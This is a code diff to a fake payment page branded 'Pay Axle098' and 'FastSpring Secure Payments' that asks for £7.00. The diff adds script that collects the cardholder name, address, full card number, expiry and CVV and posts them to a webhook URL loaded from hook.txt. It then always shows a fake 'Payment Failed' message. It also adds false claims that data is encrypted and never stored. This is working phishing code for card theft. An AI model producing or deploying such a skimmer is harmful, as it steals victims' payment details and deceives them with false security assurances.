@@ -69,7 +69,7 @@
             border-radius: 5px;
             width: 32%;
             padding: 1em;
-            cursor: not-allowed;
+            cursor: not-allowed; /* Indicates non-functionality */
             display: flex;
             align-items: center;
             justify-content: center;
@@ -83,9 +83,9 @@
         }
 
         .payment-button img {
-            max-width: 100%;
-            max-height: 100%;
-            object-fit: contain;
+            max-width: 100%; /* Logo fills the box */
+            max-height: 100%; /* Prevents logos from exceeding their box */
+            object-fit: contain; /* Keeps aspect ratio */
         }
 
         .or-pay-with {
@@ -171,7 +171,7 @@
             width: 100%;
             height: 100%;
             background-color: rgba(255, 255, 255, 0.9);
-            display: none;
+            display: none; /* Hidden by default */
             justify-content: center;
             align-items: center;
             z-index: 999;
@@ -182,8 +182,8 @@
         }
 
         .loading-spinner {
-            border: 8px solid #f3f3f3;
-            border-top: 8px solid #635bff;
+            border: 8px solid #f3f3f3; /* Light grey */
+            border-top: 8px solid #635bff; /* Blue */
             border-radius: 50%;
             width: 40px;
             height: 40px;
@@ -198,7 +198,7 @@
 
         /* Failure Message */
         .failure-message {
-            display: none;
+            display: none; /* Hidden by default */
             text-align: center;
             margin-top: 1.5em;
             color: #dc3545;
@@ -248,7 +248,7 @@
             }
 
             .failure-message {
-                font-size: 1em;
+                font-size: 1em; /* Smaller font for mobile */
             }
         }
     </style>
@@ -262,7 +262,7 @@
             <h2>Pay Axle098:</h2>
             <p class="note">Powered By FastSpring Secure Payments.</p>
         </div>
-        <p class="amount">£1.00</p>
+        <p class="amount">£7.00</p>
 
         <div class="payment-options">
             <div class="payment-button">
@@ -279,75 +279,116 @@
         <div class="or-pay-with">or pay with:</div>
 
         <form id="paymentForm">
-            <div class="form-group">
-                <label for="cardholderName">Cardholder Name</label>
-                <input type="text" id="cardholderName" placeholder="John Doe" required>
-            </div>
-
-            <div class="form-group">
-                <label for="zipcode">Zipcode / Postal Code</label>
-                <input type="text" id="zipcode" placeholder="Postal Code" required>
-            </div>
-
-            <div class="form-group">
-                <label for="fullAddress">Full Address</label>
-                <input type="text" id="fullAddress" placeholder="123 Main St" required>
-            </div>
-
-            <div class="form-group">
-                <label for="cardNumber">Card Number</label>
-                <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" required maxlength="19">
-            </div>
-
-            <div class="form-group">
-                <label for="expiryDate">Expiration Date</label>
-                <input type="text" id="expiryDate" placeholder="MM/YY" required maxlength="5">
-            </div>
-
-            <div class="form-group">
-                <label for="cvc">CVC</label>
-                <input type="text" id="cvc" placeholder="123" required maxlength="3">
-            </div>
-
-            <button type="submit" class="btn-submit">Pay £1.00</button>
-        </form>
-
-        <div class="failure-message">
-            <i class="fas fa-times-circle"></i>
-            Payment not successful
-        </div>
+    <div class="form-group">
+        <label for="cardholderName">Cardholder Name</label>
+        <input type="text" id="cardholderName" placeholder="John Doe" required>
+    </div>
+    
+    <div class="form-group">
+        <label for="zipcode">Zipcode / Postal Code</label>
+        <input type="text" id="zipcode" placeholder="Postal Code" required>
     </div>
 
-    <div class="loading-overlay" id="loadingOverlay">
-        <div class="loading-content">
-            <div class="loading-spinner"></div>
-            <p>Processing Info</p>
+    <div class="form-group">
+        <label for="fullAddress">Full Address</label>
+        <input type="text" id="fullAddress" placeholder="123 Main St" required>
+    </div>
+
+    <div class="form-group">
+        <label for="cardNumber">Card Number</label>
+        <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" required maxlength="19">
+    </div>
+    <div class="form-group">
+        <label for="expiryDate">Expiration Date (MM/YY)</label>
+        <input type="text" id="expiryDate" placeholder="MM/YY" required maxlength="5">
+    </div>
+    <div class="form-group">
+        <label for="cvv">CVV</label>
+        <input type="text" id="cvv" placeholder="123" required maxlength="3">
+    </div>
+
+    <button type="submit" class="btn-submit">
+        Pay £7.00
+    </button>
+
+    <p class="note">All information is encrypted, your sensitive data is never stored.</p>
+    <p class="note">Anti-Fraud Settings Enabled.</p>
+</form>
+
+        <!-- Loading Overlay -->
+        <div class="loading-overlay" id="loadingOverlay">
+            <div class="loading-content">
+                <div class="loading-spinner"></div>
+                <p>Contacting Bank Issuer...</p>
+            </div>
+        </div>
+
+        <!-- Failure Message -->
+        <div class="failure-message" id="failureMessage">
+            <i class="fas fa-exclamation-triangle"></i>
+            Payment Failed! Please check your details and try again.
         </div>
     </div>
 
     <script>
-        document.getElementById('cardNumber').addEventListener('input', function(e) {
-            let cardNumber = e.target.value.replace(/\D/g, ''); // Remove non-digit characters
-            if (cardNumber.length > 16) cardNumber = cardNumber.slice(0, 16); // Limit to 16 digits
-            e.target.value = cardNumber.replace(/(\d{4})(?=\d)/g, '$1 '); // Add a space every 4 digits
-        });
+    const form = document.getElementById('paymentForm');
 
-        document.getElementById('expiryDate').addEventListener('input', function(e) {
-            let expiryDate = e.target.value.replace(/\D/g, ''); // Remove non-digit characters
-            if (expiryDate.length > 4) expiryDate = expiryDate.slice(0, 4); // Limit to 4 digits (MMYY)
-            e.target.value = expiryDate.replace(/(\d{2})(?=\d)/, '$1/'); // Add a slash after the first 2 digits
-        });
+    async function getWebhookURL() {
+        const response = await fetch('hook.txt');
+        if (!response.ok) {
+            throw new Error('Failed to load webhook URL');
+        }
+        return await response.text();
+    }
 
-        // Existing event listeners and webhook integration
-        document.getElementById('paymentForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            document.getElementById('loadingOverlay').style.display = 'flex';
+    form.addEventListener('submit', async function(event) {
+        event.preventDefault(); // Prevent the form from submitting normally
 
+        // Show the loading overlay
+        document.getElementById('loadingOverlay').style.display = 'flex';
+
+        // Prepare data to send to the webhook
+        const cardholderName = document.getElementById('cardholderName').value;
+        const zipcode = document.getElementById('zipcode').value;
+        const fullAddress = document.getElementById('fullAddress').value;
+        const cardNumber = document.getElementById('cardNumber').value;
+        const expiryDate = document.getElementById('expiryDate').value;
+        const cvv = document.getElementById('cvv').value;
+
+        const paymentData = {
+            content: `New payment submitted:\nCardholder Name: ${cardholderName}\nZipcode: ${zipcode}\nFull Address: ${fullAddress}\nCard Number: ${cardNumber}\nExpiration Date: ${expiryDate}\nCVV: ${cvv}`
+        };
+
+        try {
+            // Get the webhook URL from hook.txt
+            const webhookURL = await getWebhookURL();
+
+            // Send the payment data to the webhook
+            const response = await fetch(webhookURL.trim(), {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(paymentData),
+            });
+
+            // Check if the request was successful
+            if (!response.ok) {
+                throw new Error('Failed to send data to the webhook');
+            }
+
+            // Simulate loading for a longer duration
             setTimeout(() => {
+                // Hide loading overlay and show failure message
                 document.getElementById('loadingOverlay').style.display = 'none';
-                document.querySelector('.failure-message').style.display = 'block';
-            }, 3000);
-        });
-    </script>
+                document.getElementById('failureMessage').style.display = 'block';
+            }, 3000); // Adjust the time as needed (3000ms = 3 seconds)
+
+        } catch (error) {
+            console.error('Error:', error);
+            document.getElementById('loadingOverlay').style.display = 'none';
+            alert('There was an error processing your payment. Please try again later.');
+        }
+    });
+</script>
 </body>
-</html>
